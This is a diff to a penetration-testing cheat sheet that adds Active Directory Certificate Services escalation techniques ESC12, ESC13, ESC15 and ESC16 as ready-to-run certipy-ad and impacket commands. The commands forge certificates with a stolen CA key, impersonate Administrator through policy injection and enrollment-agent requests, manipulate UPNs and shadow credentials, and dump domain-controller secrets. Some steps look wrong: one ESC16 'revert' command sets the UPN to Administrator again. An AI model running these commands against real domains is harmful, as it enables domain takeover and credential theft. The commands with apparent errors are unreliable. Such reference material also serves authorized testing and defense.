@@ -4559,9 +4559,33 @@ certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
 certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>'
 ```
 
+##### ESC12: YubiHSM2 Vulnerability (Specific Context)
+
+```shell
+certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
+```
+
+##### ESC13: Issuance Policy with Privileged Group Linked
+
+```shell
+certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<CA>' -ca '<CA>' -template 'SecureAdminsAuthentication'
+```
+
+```shell
+certipy-ad auth -pfx '<FILE>.pfx' -dc-ip '<RHOST>'
+```
+
+```shell
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+```shell
+impacket-secretsdump -just-dc-user '<RHOST>$' '<DOMAIN>/<USERNAME>@<DOMAIN>' -dc-ip '<RHOST>' -target-ip '<RHOST>' -k -no-pass
+```
+
 ##### ESC14: Weak Explicit Certificate Mapping
 
-###### ESC14 Scenario B: Target with X509RFC822 (email)
+###### Scenario B: Target with X509RFC822 (email)
 
 ```shell
 python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
@@ -4581,6 +4605,90 @@ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -temp
 
 ```shell
 certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
+```
+
+##### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
+
+###### Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)
+
+```shell
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
+```
+
+```shell
+certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>' -ldap-shell
+```
+
+###### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)
+
+```shell
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -application-policies 'Certificate Request Agent'
+```
+
+```shell
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -pfx '<FILE>.pfx' -on-behalf-of '<DOMAIN>\Administrator'
+```
+
+```shell
+certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>'
+```
+
+##### ESC16: Security Extension Disabled on CA (Globally)
+
+###### Scenario A: With UPN Manipulation (in Compatibility Mode - StrongCertificateBindingEnforcement = 1 or 0)
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
+```
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
+```
+
+```shell
+certipy-ad shadow -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -account '<USERNAME>' auto
+```
+
+```shell
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+```shell
+certipy-ad req -k -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User'
+```
+
+Revert the `UPN` to the original `user`.
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
+```
+
+```shell
+certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
+```
+
+###### Scenario B: Combined with ESC6 (CA allows SAN specification via request attributes)
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
+```
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
+```
+
+```shell
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500'
+```
+
+Revert the `UPN` to the original `user`.
+
+```shell
+certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
+```
+
+```shell
+certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
 ```
 
 #### ADCSTemplate
